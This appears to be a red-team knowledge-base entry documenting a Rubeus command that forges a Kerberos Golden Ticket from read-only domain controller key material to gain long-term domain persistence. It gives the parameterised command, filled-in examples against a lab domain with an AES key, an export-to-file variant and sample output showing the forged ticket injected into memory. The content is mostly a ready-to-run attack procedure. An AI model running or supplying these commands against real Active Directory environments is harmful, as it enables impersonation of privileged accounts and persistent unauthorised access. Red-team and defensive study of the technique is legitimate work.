---
type: command
executor: powershell
data: >-
  Rubeus.exe golden /rodcNumber:$_RODC_NO /aes256:$_RODC_AES_KEY
  /user:$_TARGET_USER /id:$_USER_RID /domain:$_DOMAIN /sid:$_DOMAIN_SID
tags:
  - persistence
  - kerberos
platforms:
  - Windows
verified: true
validated: true
---

# rubeus-create-golden-ticket

## Command

```powershell
Rubeus.exe golden /rodcNumber:$_RODC_NO /aes256:$_RODC_AES_KEY /user:$_TARGET_USER /id:$_USER_RID /domain:$_DOMAIN /sid:$_DOMAIN_SID
```

## Description

This command uses Rubeus to forge a Golden Ticket TGT using RODC parameters, enabling long-term domain access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /rodcNumber:$_RODC_NO | RODC number | Yes |
| /aes256:$_RODC_AES_KEY | AES-256 key for encryption | Yes |
| /user:$_TARGET_USER | User to impersonate (e.g., Administrator) | Yes |
| /id:$_USER_RID | Relative ID of the user | Yes |
| /domain:$_DOMAIN | Domain name | Yes |
| /sid:$_DOMAIN_SID | Domain SID | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871
```

### Advanced Usage

Export to file:

```powershell
Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871 /outfile:golden.kirbi
```

## Expected Output

Forged ticket:

```
[*] Action: Create Golden Ticket
[*] User              : admin
[*] Domain             : lab.local
[*] SID                : S-1-5-21-1437000690-1664695696-1586295871
[*] RID                : 1136
[*] Ticket created and exported to: golden_ticket.kirbi
[*] Ticket saved to memory and injected
```

## Related

- [[procedures/RODC-Key-List-Extraction-and-Golden-Ticket-Creation]]
- [[tools/Rubeus]]
